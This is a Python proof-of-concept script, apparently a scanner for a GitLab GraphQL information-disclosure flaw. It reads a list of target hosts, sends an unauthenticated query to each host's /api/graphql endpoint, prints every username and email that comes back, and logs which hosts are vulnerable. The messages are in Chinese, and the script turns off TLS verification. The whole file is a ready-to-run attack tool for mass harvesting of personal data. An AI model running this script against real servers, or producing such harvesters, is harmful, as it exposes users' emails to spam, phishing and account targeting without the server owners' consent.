import requests
import sys
import random
import re
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def POC_1(target_url):
    vuln_url = target_url + "/api/graphql"
    user_number = 0
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json",
    }
    try:
        data = """
        {"query":"{\\nusers {\\nedges {\\n  node {\\n    username\\n    email\\n    avatarUrl\\n    status {\\n      emoji\\n      message\\n      messageHtml\\n     }\\n    }\\n   }\\n  }\\n }","variables":null,"operationName":null}
        """
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data ,verify=False, timeout=5)
        if "email" in response.text and "username" in response.text and "@" in response.text and response.status_code == 200:
            print('\033[32m[o] 目标{}存在漏洞, 泄露用户邮箱数据....... \033[0m'.format(target_url))
            for i in range(0,999):
                try:
                    username = json.loads(response.text)["data"]["users"]["edges"][i]["node"]["username"]
                    email = json.loads(response.text)["data"]["users"]["edges"][i]["node"]["email"]
                    user_number = user_number + 1
                    print('\033[34m[o] 用户名:{} 邮箱:{} \033[0m'.format(username, email))
                except:
                    print("\033[32m[o] 共泄露{}名用户邮箱账号 \033[0m".format(user_number))
                    with open("GitLab Graphql邮箱信息泄露 vul.txt", "a+") as f:
                        f.write(target_url+"存在漏洞" + "\n")
                    continue
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    for target_url in open("GitLab.txt"):
        target_url = target_url.replace("\n", "")
        POC_1(target_url)